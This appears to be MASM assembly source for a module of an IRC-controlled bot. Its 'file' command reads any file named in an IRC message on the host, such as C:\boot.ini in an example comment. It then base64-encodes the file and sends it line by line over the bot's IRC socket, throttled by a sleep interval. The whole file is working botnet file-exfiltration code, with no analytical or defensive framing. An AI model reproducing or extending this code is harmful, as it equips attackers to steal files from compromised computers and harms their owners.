;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include     project.inc
include     ..\..\common\misc.inc

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
get_next_line   proc    lpmem, dwline
    pushad
    
    xor     ebx, ebx
    
    mov     esi, lpmem
    .while  (1)
        .break  .if !dword ptr [esi] && !dword ptr [esi+4]; no lines.

        .repeat
            inc     esi
        .until  !word ptr [esi]
        inc     ebx
        
        .if     ebx == dwline
            add     esi, 2
            mov     dword ptr [esp+28], esi
            popad
            ret
        .endif
        
        
    .endw
    mov     dword ptr [esp+28], 0
    popad
    ret
get_next_line   endp

;-----------------------------------------------------------------------
crop_crlf   proc    lpmem
    mov     esi, lpmem
    .while      byte ptr [esi]
        .if     byte ptr [esi] == CR || byte ptr [esi] == LF
            and byte ptr [esi], 0
        .endif
        inc     esi
    .endw
    ret
crop_crlf   endp

;-----------------------------------------------------------------------
file   proc    lpszline
    local   szmsgbuffer[1024]:byte, szfilename[MAX_PATH]:byte, szbuffer1[64]:byte, szbuffer2[64]:byte
    local   szsleep[8]:byte, dwsleep, fileio:sfileio, hb64, hmem, dwline

    invoke  get_token, addr szbuffer1, lpszline, ' ', 0, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, ':', 1, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, '!', 0, FALSE
    
    ; its for
    invoke  get_token, addr szbuffer2, lpszline, ' ', 2, FALSE
    
    .if     byte ptr szbuffer2 == '#'
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :'), addr szbuffer2
    .else
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :'), addr szbuffer1
    .endif
    
    ;.file -v C:\boot.ini 1200
    ; gets file name
    invoke  get_token, addr szfilename, lpszline, ':', 2, TRUE
    invoke  get_token, addr szfilename, addr szfilename, ' ', 1, TRUE
    invoke  get_token, addr szfilename, addr szfilename, '-', 0, TRUE
    
    ; third param
    invoke  get_token, addr szsleep, addr szfilename, ' ', 2, FALSE
    invoke  printf, SADD("sleep interval: %s"), addr szsleep
    invoke  atodw, addr szsleep
    mov     dwsleep, eax
    .if     dwsleep > 1000*60 || dwsleep < 1500
        mov     dwsleep, 1500
    .endif
    invoke  printf, SADD("sleep interval: %0.8X"), dwsleep
    
    invoke  get_token, addr szfilename, addr szfilename, ' ', 1, FALSE
    invoke  printf, SADD("file is: %s"), addr szfilename

    ;_createfile    proto   lpszfile:dword, dwaccess:dword, dwcreation:dword, dwmodification:dword, dwlength:dword, lpsfileio:dword
    invoke  _createfile, addr szfilename, _FILEIO_READWRITE, OPEN_EXISTING, _FILEIO_MODIFYCOPY, NULL, addr fileio
    .if     !eax
        ;B64_Encode proto   hmapview:dword, dwsize:dword, dwflags, dwfileout, 0
        invoke  B64_Encode, fileio.hview, fileio.usize, VIRTUAL_ALLOC OR WRITE_HEADER, addr szfilename, NULL
        mov     hb64, eax
        invoke  crop_crlf, eax
        mov     dwline, 1

        invoke  VirtualAlloc, 0, ecx, MEM_COMMIT, PAGE_READWRITE
        .if     eax
            mov     hmem, eax
            ;int     3

            invoke  wsprintf, hmem, SADD("%s%s", EOL), addr szmsgbuffer, SADD("Binary-b64/MIME [+]")
            mov     eax, lpbot_info
            mov     ebx, (sbot_data ptr [eax]).dwsocket
            invoke  send, ebx, hmem, FUNC(lstrlen, hmem), 0

            mov     eax, hb64
            .while  (1)

                .if     word ptr [eax] == 1310h
                    invoke  wsprintf, hmem, SADD("%s", EOL), addr szmsgbuffer
                .else
                    invoke  wsprintf, hmem, SADD("%s%s", EOL), addr szmsgbuffer, eax
                
                .endif
                
                
                invoke  printf, SADD("%s"), hmem
                mov     eax, lpbot_info
                mov     ebx, (sbot_data ptr [eax]).dwsocket
                invoke  send, ebx, hmem, FUNC(lstrlen, hmem), 0
                
                invoke  Sleep, dwsleep

                invoke  get_next_line, hb64, dwline
                .break  .if !eax 
                inc     dwline 
                
                
            .endw
            
            invoke  wsprintf, hmem, SADD('%s%s', EOL), addr szmsgbuffer, SADD("[-]")
            mov     eax, lpbot_info
            mov     ebx, (sbot_data ptr [eax]).dwsocket
            invoke  send, ebx, hmem, FUNC(lstrlen, hmem), 0
            
            invoke  VirtualFree, hmem, 0, MEM_RELEASE
            
        .else
            
            invoke  wsprintf, addr szbuffer1, SADD('%s%s', EOL), addr szmsgbuffer, SADD("[-] Couldn't allocate memory!")
            mov     eax, lpbot_info
            mov     ebx, (sbot_data ptr [eax]).dwsocket
            invoke  send, ebx, addr szbuffer1, FUNC(lstrlen, addr szmsgbuffer), 0
        .endif
        
        invoke  B64_Clear, hb64, VIRTUAL_ALLOC
    
    .endif
    invoke  _closefile, addr fileio
    
    mov     eax, lpbot_info
    mov     ebx, (sbot_data ptr [eax]).dwsocket
    invoke  send, ebx, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0
   
    ret
file   endp

;-----------------------------------------------------------------------
ibm_init    proc    lpsbot_data
    
    m2m     lpbot_info, lpsbot_data
    mov     eax, offset mdt
    
    ret
ibm_init    endp

end
;-----------------------------------------------------------------------
